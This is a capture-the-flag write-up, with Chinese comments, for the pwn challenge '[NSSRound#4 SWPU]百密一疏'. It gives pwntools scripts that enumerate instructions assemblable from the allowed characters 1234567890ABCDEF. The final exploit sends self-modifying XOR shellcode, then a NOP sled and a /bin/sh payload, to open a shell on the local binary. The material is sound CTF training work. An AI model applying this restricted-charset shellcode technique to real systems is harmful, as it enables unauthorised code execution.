`[NSSRound#4 SWPU]百密一疏` 限制输入 1234567890ABCDEF

pwn_shellcode_0-91-F.txt

# step1

```py
from itertools import product

from pwn import *

context.arch = 'amd64'
a = '1234567890ABCDEF'

f = open('code2.txt', 'w', encoding='utf8')
res = ''

# for i in range(1, 3):
#     for s in product(a, repeat=i):  # i: 1,2,3
#         btxt = ''.join(s).encode()
#         values = disasm(btxt)
#         res += values + '\n'

for i in range(3, 4):
    for s in product(a, repeat=i):  # i: 1,2,3
        btxt = ''.join(s).encode()
        values = disasm(btxt)
        res += values + '\n'

f.write(res)
f.close()
```

# step2
```py
a = b'1234567890ABCDEF'

for i in a:
    print(hex(i), chr(i ^ 0xf), chr(i ^ 0x5))
```

# step3

```python
"""
只能输入特定字符的Shellcode https://www.bilibili.com/video/BV1Z14y1B7ji/
[NSSRound#4 SWPU]百密一疏
"""
from pwn import *

binary = './pwn'
elf = ELF(binary, checksec=False)

warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level='debug', arch=elf.arch, os='linux', binary=binary)

s = process()

# sc每行是3个字节，这样不对齐了
sc = '''
xor    eax, DWORD PTR [rdx+0x34]
xor    DWORD PTR [rdx+0x30], eax 
xor    eax, DWORD PTR [rdx+0x34]
xor    DWORD PTR [rdx+0x34], eax 
'''

sc = asm(sc)
sc += ((0x30 - len(sc)) // 2) * b'\x39\x32'
sc += b'\x39\x33' * 2
sc += b'6666'
print(hex(len(sc)))
print(disasm(sc))
s.sendline(sc)
pause()
s.sendline(len(sc) * b'\x90' + asm(shellcraft.sh()))
s.interactive()
```